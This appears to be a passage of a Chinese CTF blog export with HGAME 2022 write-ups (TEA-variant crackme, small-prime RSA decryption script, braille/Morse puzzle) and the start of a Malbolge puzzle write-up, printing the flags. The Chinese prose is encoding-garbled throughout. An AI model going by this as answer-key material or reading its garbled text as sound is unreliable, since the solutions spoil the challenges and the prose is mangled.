hgame{weLC0ME_To-tHE_WORLD_oF-AnDr0|D} æˆ–è€…èµ›åšå¨å­ä¹Ÿè¡Œ creakme Description flag æ ¼å¼ï¼šhgame{} Challenge Address https://4nsw3r-1308188104.cos.ap-nanjing.myqcloud.com/a7218184a63354eff3a7adfba246b9e85387ec.exe æ‹–è¿› IDA int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // edx int i; // esi unsigned int v5; // edi unsigned int v6; // ebx int v7; // esi int v8; // esi _DWORD v10[17]; // [esp+Ch] [ebp-8Ch] BYREF __int128 v11[2]; // [esp+50h] [ebp-48h] char Arglist[32]; // [esp+70h] [ebp-28h] BYREF int v13; // [esp+90h] [ebp-8h] int v14; // [esp+94h] [ebp-4h] memset(Arglist, 0, sizeof(Arglist)); sub_40103A(\"%s\", (char)Arglist); strcpy((char *)v10, \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"); v3 = 0; v14 = 0; for ( i = 0; i &lt; 32; v14 = i ) { v5 = *(_DWORD *)&amp;Arglist[i]; v6 = *(_DWORD *)&amp;Arglist[i + 4]; v13 = 0; v7 = 32; do { v3 += 0x12345678; v5 += v3 ^ (v3 + v6) ^ (v10[2] + 16 * v6) ^ (v10[3] + (v6 &gt;&gt; 5)); v6 += v3 ^ (v3 + v5) ^ (v10[0] + 16 * v5) ^ (v10[1] + (v5 &gt;&gt; 5)); --v7; } while ( v7 ); v8 = v14; v3 = 0; *(_DWORD *)&amp;Arglist[v14] = v5; *(_DWORD *)&amp;Arglist[v8 + 4] = v6; i = v8 + 8; } v11[0] = xmmword_402180; v11[1] = xmmword_402170; while ( Arglist[v3] == *((_BYTE *)v11 + v3) ) { if ( ++v3 &gt;= 32 ) { sub_40100C(\"right!\", v10[0]); return 0; } } sub_40100C(\"wrong!\", v10[0]); return 0; } .rdata:00402170 xmmword_402170 xmmword 65E0F2E3CF9284AABA5A126DAE1FEDE6h .rdata:00402170 ; DATA XREF: _main+BDâ†‘r .rdata:00402180 xmmword_402180 xmmword 0ED9CE5ED52EB78C2030C144C48D93488h .rdata:00402180 ; DATA XREF: _main+B0â†‘r çœ‹èµ·æ¥æ˜¯é­”æ”¹çš„ Tiny Encryption Algorithm (TEA) ï¼ˆå’• CryptoEasy RSA Description è¿™ RSA ä¸æ˜¯æœ‰æ‰‹å°±è¡Œï¼Ÿï¼ (100åˆ†çš„é¢˜èƒ½æ‹¿125åˆ†ï¼Œè¿™ä¸è¡€èµš) Challenge Address [https://cmfj-1308188104.cos.ap-shanghai.myqcloud.com/Week1/Easy%20RSA.zip](https://cmfj-1308188104.cos.ap-shanghai.myqcloud.com/Week1/Easy RSA.zip) Task: from math import gcd from random import randint from gmpy2 import next_prime from Crypto.Util.number import getPrime from secret import flag def encrypt(c): p = getPrime(8) q = getPrime(8) e = randint(0, p * q) while gcd(e, (p - 1) * (q - 1)) != 1: e = int(next_prime(e)) return e, p, q, pow(ord(c), e, p * q) if __name__ == '__main__': print(list(map(encrypt, flag))) # [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)] Exp: \"\"\" MiaoTony \"\"\" import gmpy2 from Crypto.Util.number import long_to_bytes l = [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)] def decrypt(x): e, p, q, c = x phi = (p-1) * (q-1) d = gmpy2.invert(e, phi) return chr(pow(c, d, p*q)) for i in l: print(decrypt(i), end='') # hgame{L00ks_l1ke_y0u've_mastered_RS4!} Matryoshka Description æŸå¤©é¥­å¡æ¡åˆ°äº†å¼ å¥‡æ€ªçš„çº¸æ¡ã€‚ ä¸Šé¢å†™æ»¡äº†å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦ã€‚ çº¸æ¡èƒŒé¢è¿˜å†™ç€å¥‡æ€ªçš„è¯ï¼šâ€œCaesarï¼š21; VigenÃ¨re:hgameâ€ã€‚ ä½ èƒ½çœ‹æ‡‚ä¸Šé¢å†™äº†ä»€ä¹ˆå—ï¼Ÿ Challenge Address https://cmfj-1308188104.cos.ap-shanghai.myqcloud.com/Week1/Matryoshka.zip é¢˜ç›®åç§°å°±æ˜¯å¥—å¨ƒå•Šï¼ˆï¼ˆ â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¤â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¤â ¨â ¨â Œâ ¨â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¤â ¨â ¨â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¤â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¤â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¤â ¨â ¤â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¨â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¤â ¨â ¨â Œâ ¨â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¤â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¨â ¤â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¤â ¨â ¨â Œâ ¨â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¤â ¤â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¨â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¨â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¨â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¤â ¤â ¨â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¨â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¤â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¤â ¨â ¨â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¤â ¤â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¤â ¤â ¨â Œâ ¨â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¤â ¨â ¨â Œâ ¨â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¤â ¤â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¨â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¤â ¤â ¤â ¤â Œâ ¨â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¤â ¨â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¨â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¤â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¤â ¤â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¤â ¤â ¤â Œâ ¨â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¤â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¤â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¤â ¨â ¤â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¨â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¤â ¤â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¤â ¤â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¨â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¨â Œâ ¨â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¤â ¨â ¤â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¨â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¨â Œâ ¨â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¤â ¤â ¤â ¨â ¨â Œâ ¤â ¨â ¨â ¨â ¨â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¤â ¨â ¨â ¤â ¤â Œâ ¨â ¨â ¨â ¨â ¤â Œâ ¤â ¨â ¨â ¨â ¨ æ˜¯ç›²æ–‡ï¼Œä»¥ä¸ºæ˜¯åŠ å¯†ï¼Œè¯•äº†å‡ ä¸ª https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen æˆ–è€… http://www.atoolbox.net/Tool.php?Id=837 å•Šï¼Œéƒ½ä¸è¡Œâ€¦â€¦ç›²æ–‡é‡Œæ²¡æœ‰è¿™ç§çš„å§ï¼Œéš¾é“æ˜¯ä¸­æ–‡ï¼Ÿ çŸ¥ä¹ - å“ªæœ‰ä¸“ä¸šç›²æ–‡åœ¨çº¿ç¿»è¯‘å•Šï¼Ÿ ä¸­å›½ç›²æ–‡æ•°å­—å¹³å°æ±‰ç›²ç¿»è¯‘ç³»ç»Ÿï¼Œè¿™ç©æ„åªèƒ½æ±‰å­—è‹±æ–‡è½¬ç›²æ–‡ï¼Œä¸èƒ½åè¿‡æ¥ï¼Œå˜¤ï¼ æœ€åå‘ç°äº†è¿™ä¸ª https://www.reddit.com/r/codes/comments/nnma6p/funky_cryptography_puzzle_can_anyone_figure_it_out/ å™¢ï¼Œèµ›åšå¨å­å°±èƒ½è§£å•Šï¼Œæˆ‘ç´«èœã€‚ ä¹‹åæ˜¯æ‘©æ–¯ï¼Œä¸è¿‡æ˜æ˜¾ä¸å¯¹ï¼Œå¾—é€†åºã€‚ã€‚ åæ­£æœ€åæ˜¯ä¸‹é¢è¿™æ ·ã€‚ hgame{Welc0me_t0_the_w0rld_0f_crypt0graphy!} Animal FarmA Fairy Story by George Orwell https://www.marxists.org/subject/art/literature/children/texts/orwell/animal-farm/ch09.htm ç»™äº†æ‰“ä¹±äº†é¡ºåºçš„åŸæ–‡å’Œå¯†æ–‡æ–‡ä»¶ï¼Œå…ˆåŒ¹é…ä¸€ä¸‹æ‰¾åˆ°å¯¹åº”å…³ç³»ï¼Œå†è¿˜åŸ flag å°±å¥½äº†ã€‚ å°ç»“å°±è¿™æ ·å§ï¼Œæ°´å®Œäº†ï¼Œå–µ~ pwn å¥½éš¾ï¼Œå‘œå‘œå‘œã€‚ å°±è¦è¿‡å¹´å•¦ï¼Œç¥å¤§å®¶è™å¹´å¤§å‰ï¼Œè™è™ç”Ÿå¨ï¼ ï¼ˆæºœäº†æºœäº†å–µ~","path":"2022/01/29/CTF_2022HgameWeek1/"},{"title":"CTF | 2022 GZTime's å…ƒæ—¦çº¢åŒ…è§£è°œ WriteUp","text":"å¼•è¨€æ—¶é—´æ€»æ˜¯è¿‡å¾—é‚£ä¹ˆå¿«ï¼Œè¿™å‡ å‘¨å¿™ç€å„ç§æœŸæœ« ddlï¼Œç›´åˆ°å®éªŒå®¤å¹´åº•èšé¤äº†æ‰æ„è¯†åˆ°å·²ç»å¹´æœ«äº†ã€‚ è½¬çœ¼é—´ 2022 å¹´å°±åˆ°å•¦ï¼ æ–°å¹´ç¬¬ä¸€ç¯‡ï¼Œå…ˆç¥å¤§å®¶æ–°å¹´å¿«ä¹ï¼Œæ–°çš„ä¸€å¹´é‡Œéƒ½èƒ½ flag å¤šå¤šï¼Œéƒ½èƒ½æœ‰æ–°çš„æ”¶è·å–µ~ è·¨å¹´çš„æ—¶å€™å¬ GZTime è¯´å‡†å¤‡äº†å…ƒæ—¦è§£è°œçº¢åŒ…ï¼Œäºæ˜¯å°±æ¥ç„äº†ä¸€çœ¼ã€‚ ä¸¥æ ¼æ¥è¯´è¿™åº”è¯¥ä¸å« CTF å§ï¼Œä¸è¿‡æ‡’äº†ï¼Œå°±å§‘ä¸”è¿™ä¹ˆå½’ç±»å§ã€‚ é¢˜ç›®å¦‚ä¸‹ã€‚ TimeAxis, [2022/1/1 1:41]è¿™æ˜¯ä¸€ä»½å…ƒæ—¦çº¢åŒ…ã€‚è™½ç„¶ä¹Ÿå°±åªæœ‰ä¸€äº›ç¼–è§£ç çš„ä¸œè¥¿ç½¢äº†.jpgæœ‰æ•ˆæœŸå¤§çº¦ 2022-01-02 00:00 http://redpack.gz.wtf/2022.binAfter Base64:http://redpack.gz.wtf/2022.b64.txt å–µå–µé¡ºä¾¿ä¸¢äº†ä¸€ä»½ binary æ–‡ä»¶ åœ¨è¿™é‡Œã€‚ ä¹‹åç»™å‡ºäº†ä¸€ç³»åˆ— hintã€‚ TimeAxis, [2022/1/1 12:54]HINT 1: æœ€å¼€å§‹æ˜¯ä¸ª deflate å‹ç¼© TimeAxis, [2022/1/1 15:27]HINT 2: ç¬¬äºŒå±‚æ˜¯ä¸ªå¯ä»¥è¿è¡Œçš„ç¨‹åºï¼Œä½†å¹¶ä¸æ˜¯ binaryï¼ˆ TimeAxis, [2022/1/1 15:44]HINT 3: ä»¥åŠæœ‰ä¸€æ¬¡ä¼šç”¨åˆ° xor åŠ å¯† TimeAxis, [2022/1/1 18:08]HINT 4: malbolge TimeAxis, [2022/1/1 18:40]HINT 5: prod[]ä¸åé¢æ˜¯åˆ†ç¦»çš„ TimeAxis, [2022/1/1 19:44]HINT 6: å¦‚æœä½ å¾—åˆ°äº†Keyï¼Œä½ ä¼šçŸ¥é“ä¸€å®šæ˜¯å®ƒçš„ æ­¥éª¤Step 1http://redpack.gz.wtf/2022.binAfter Base64:http://redpack.gz.wtf/2022.b64.txt é¦–å…ˆæ‹¿åˆ°ä¸€ä¸ª äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ–è€…è¿™ä¸ª base64 ç¼–ç åçš„æ–‡ä»¶ã€‚ çœ‹äº†ä¸‹ç”¨åˆ°äº† deflate å‹ç¼©ï¼ˆåé¢ hint ä¹Ÿç»™äº†ï¼‰ï¼Œinflate ä¸€ä¸‹ã€‚ å¾—åˆ°çš„ä¸œè¥¿é•¿è¿™æ ·â€¦â€¦ D'`$#]\\~mlGjzhwfv3,+=`LLKm[Z(4EVfB@!a&gt;O_)([wvo5slTjihmfe+Lbg`ed]\\\"`_AWV[Tx;QPUNr5KPONGFjD,HAF?&gt;bBA@?&gt;7};:3W7wv4-,10)M-ml*)(!E%|#\"y?w|u;yxwYXtsl2pRhgle+Lbg`ed]\\\"`_^@\\Uy&lt;XQuUTSR43ImMLKDIHGF?cCB;:?&gt;7[|{92V05.R210)o-&amp;J*)('g%${Ay~w=^]sxqputml2poQmf,dLhgf_%cbDCY}]\\[T&lt;RvVUT6LpPIHMLEDhHAF?cCB;#?8\\&lt;|{321U5u-Q10po'&amp;+*#G'~%$#z@~}|utyxwp6tVlkpi/mfkd*hgfe^c\\\"`_A@Vz=SXWPOsMLKPImGFKJCHGF?c&amp;%A@9]7};4X87wv4-,10)M'm%$)(!E%$#\"!a}v&lt;zsrqp6Wmrqpih.lkjihg`&amp;d]E[!_^@?UTSw:VONMqQP2HlLEiCgGFE&gt;=aA@\"!=&lt;5Yz210T4ts1*No',%$)(!~D$dc!x}vu;srwp6WVl2johglkd*ba`_^]#a`_XW\\[ZYRvVU76LpP2NMLEiCBAFE&gt;bB;:?&gt;=6Z{9870Tu3,P0/.'m+$H(h&amp;%$#z@~}|{ts9wvuWmrqjoh.lkjc)gIedcb[!_X]\\UTxXWVO7SLpP2HMFKDhBAF?&gt;b%A@?&gt;7[;43W76v.3,P0/o-&amp;J*j(!~}C#\"bx&gt;|utyrq7oWslkjong-edchgfe^]#aC_^]\\Uy&lt;;WPUTSRQJn10LKJCBG@d&gt;=&lt;A:^!7&lt;5:3Wx05.-,+O/on,+*#Gh&amp;%${zy?}|u]yxwp6tVl2pRh.lNjchg`_%Fb[`YX|\\[ZYXWVUTSRQP2HMFEDhHAFE&gt;=a;@9&gt;7&lt;5Yz876/S-s10/.-&amp;J*)i!&amp;}${A!a`|u;yrwvo5slTpong-kMiha'Hdc\\\"`_X@\\Uy&lt;;WPUTSRKJOHl/KJIHAF?c=BA:?8\\&lt;|{321Uvu3,P0/.'&amp;J*)\"'~D$#\"!a}|u;yxwYun4rkjih.lNjihg`_%]ba`_^WVz=YRWPt76RQPONGkE-CgGF(D=aA@\"!7[|{98765.R2r*No-,+$Hi!&amp;}$#z@xw|uzyxwp6Wmrqpi/mlkjib(Ie^]\\\"`Y^W{[Z&lt;;WVOsSRQP2NGLEDhHG)(D=aA#9]7&lt;5Y9y1Uvu-,10/(L,%k#(!E%|dz@xw|uzyxwp6tVrkji/Ple+iKgf_%]\\a`_^]\\UTxXWP8NMLpJINMFEi,BGF?cCB$:^!7&lt;5:3276/S32+*)(L&amp;%*#(!~D$#\"yx}|u;\\[q7utsrqpi/glkdc)aI_dcb[Z~^@\\UTYRv9OTMLpPON0/EJCgA)?cCB$@98=&lt;;4X870v.32+O)(-,+*#G'&amp;%$dz@a}|{t:rwputml2ponglkd*hJ`edcb[Z~X]\\[Tx;:PONrLKPONGFj-CHG@?c&amp;BA:?&gt;76Z:9yx65.R2r0/('&amp;J*ji'~%|#\"y?`|{tsr8vuWmrqpingf,jiKgf_%cbD`Y}@?UZYRvVUT6LpP2NMLEiIBGFED=aA@\"!76;4X87w5.R2+q).'&amp;J*ji!&amp;}${Aba}v{t:xZpotm3kjih.Oedihg`&amp;G]\\a`_X|\\[Z&lt;;WPUTSRQJnN0/EJCgGFE&gt;&amp;&lt;`@?&gt;7};:3Wx05.3,P0/.-,%Ij('~%|#\"y?w_{zyr8putsrkj0hgfkjc)JI_d]\\\"ZY}WV[TSRWPtTS54JIHMFjD,BGF?&gt;bBA@?8\\&lt;|43W765u-Q10/o'Kl$)\"!E%$#\"!a}v&lt;]yxwpunsl2joh.lkjiKa'_G]#aC_^WVzZSRQu8TMRKPImMLEDIBf)E&gt;=B;_?&gt;~&lt;5Y987654321q)M-,+*ji!Ef${Aba}|{zyxwp6nsrk1Rhglkd*hgf_G]#aCBX]VUy&lt;;WPUTSRKJOHlLEDCBGF?cCB$@98=&lt;;4X81w/S3210)M-,+k)(!E%${z!x&gt;|{]\\xqpo5slTjihmfe+LKgf_%cbaZY}@\\[TSXWPt76LKJnNG/Ei,HGFED=a;:9&gt;7&lt;;:32V6v4-,P0).-,+$#G'~f${A!~w_u;yxwp6nslkj0nmledcbgf_%cbDZ_^WVz=SRWPtNMLQPOHlL.DIHGF?cCB$:^!=&lt;;:981U54-21*N.'m%$)('~D${c!x&gt;_^tyxqp6WVlqji/glejc)g`Hd]#a`_^@\\Uy&lt;XWPt7MLpPO1GFKDhHGF('C&lt;`@\"8=&lt;5Yzy10/S32+*).-&amp;J*)i!E%|{A!~w_utyxq7utVrkji/gOe+LKgf_%cba`BX]VUy&lt;XQuUTSR43ImMFKJCHAeE'&amp;&lt;`#9&gt;7&lt;;:981Uvu-,10/(L,%k#(!Ef${\"yx&gt;v{t:rZvun4Uqj0nmlkjc)gfHG]#D`Y^W\\Uy&lt;XWPt7SLQJn1MFEJCgA@d'CB;:9]7};:3W7wv432+O/.-&amp;J*ji!Efe#z@x}|{zyxwp6WVlqjoh.leMib(fHGcb[ZY}|\\[ZYR:PtNSLKJnN0/EJCg*F?cC%;:?8\\&lt;|432V6/u-Q10/.'&amp;+$)\"F&amp;%e{\"yx}|ut:xwputm3Tpihmf,jibJ`&amp;^F\\a`_X|\\[=YXWPOs65KPOHGk.JIHG@d'&amp;&lt;`@?!~&lt;5Y981w5.R2r*N.-,+k#(!E}${A!~}v{t:xZpunsl2pongOe+LKgf_%Fba`_^]VzT&lt;XWVOs65KPImML.DhHGFE'&amp;&lt;`:?&gt;76;:3Wx654-,P0).-,+$#G'~}${z@a}vuzs9Zvo5Vlqji/mle+LKafedcb[Z~^]\\[Z&lt;RvVONMRQPIm0/EJCgGFED=aA:9&gt;7[|{98765.R2+q).'&amp;J*ji'~%|#\"y?w_{zyr8vuWVrk1ohmf,jLha'e^Fb[Z_X|V&gt;ZSw:VUNMqQJONMLEDhBGFED=aA#9]~&lt;;:9876/S32r*N.-,%k)\"F&amp;%$d\"y?wv{tyr8vXWsrk1Rnmle+LKgf_%cbD`YXW\\UZSwW9OTSLKoONG/KDCBf@(&gt;=aA@?87[543W70T432r0)M-,lk)\"Fg%$#zy~w=^]yxqpo5mrkpohmlkd*hgf_Gcb[!_^@?[ZYRv9OTMRQPIm0/EDCBGF?cCB$#?8\\&lt;|{321U543sr*N.n,+*)\"F&amp;f${Ab~w|uzs9qvonm3kSong-kjc)gIHdcbaZ~^@?UZYRvVUT6LpP2NGkE-CHAF?cCB;#?8\\&lt;|{321U5u-Q+*/(-&amp;+*#(!E%${A!a}v&lt;]\\rqp6Wmrqpih.lNd*ha`e^cb[!YXW{[T&lt;RvP8TMRQPIHGkEJCBfF('C&lt;`#9&gt;7&lt;5Y9y10/S3,r*N.-&amp;%$#GF&amp;f|{\"y?`v{tyr8Yotml2pingfkjc)gfed]b[!_^@VUTxX:VOsSRKJn10FEiCgGFE'&amp;&lt;`:987[549870/St,+*/(L&amp;l$#(!Efe{zy?w_utyxq7onml2poQg-Njchgf_d]#DC_^WVzZSRQPOsS54PINGkKD,HAe(DCBA:^!~&lt;5Y981w543,P0/o-,%*)(!~D$#\"bx&gt;|{zs[q7uWsrkj0ngfkjib(f_Gcb[!B^WVzTx;QPUNr54JONGFEi,HG@d'&amp;&lt;`:\"8=&lt;54X87w5.-210/(L,%k#(!E%$#cbx&gt;|u]yxwp6WVlqjoh.ONjiha'edFEaZ~X@\\[TxXWP8NrLQPONGLEDhHGFE&gt;&amp;&lt;`@9&gt;=6Z:9y10/S32+q)M-&amp;+*#G'&amp;}|{z@~w_utyxq7otmrqji/mlejihg`&amp;dcbDZ_^WVzZSwQVUNMq4JIHMLEi,BAF?&gt;=aA#9]76;:9870/Sts+*)Mn&amp;+*#('~De#\"!x}|{t:xwvunml2Sihg-kdiba`&amp;G]\\a`_X|?UZSRvVU76LpJOHl/EDCBAeEDCBA#9]=6|49810/.R2r*N.n,%I)('g}C#c!~}v{t:[wvunml2johgle+LKgf_%F\\[`_^]VzT&lt;XWVOs65KPImMFKJCgG@?&gt;=a;_9&gt;=&lt;;:981Uv.32+O/.-ml$Hi'&amp;%$#z@x}v{tyxwvo5Vrqpi/g-kjibJ`&amp;G]baZY}]\\[ZYRWVUNrRQ3IHMLEiI+*F?&gt;b%A@9]=&lt;5:32V6/4-Q10/(L,+$#(!E%e#z@a}v{t:[wvonm3qpongOe+LKgf_%FE[!_X@\\[TxXWV8NrR43IHGkKDCgA)?&gt;C&lt;`@\"&gt;76Z:9yx65.R,10/(Lm%$#G'&amp;f|{\"y?`_{tyrwp6Wmrqpi/g-kMLhg`&amp;^]\\[!_^@?UTSw:VONMq4JIHMLEiIBGF?c=%;_?&gt;7&lt;543Wx05.R2+q/('&amp;J*#\"Fg%$#\"!x&gt;|ut:[Zvutmlkj0nPOkd*hJ`edcb[Z~^@\\UTxXWVU7Mq4JIHMLEiIH*)?&gt;=a;@?&gt;=6Z:9yx65.RQ10/.',%$#Gh~D$#\"!x}v&lt;z\\r8vutVlkj0QPfejc)gI_d]b[!_^@VzTSRQPtT6LQJIm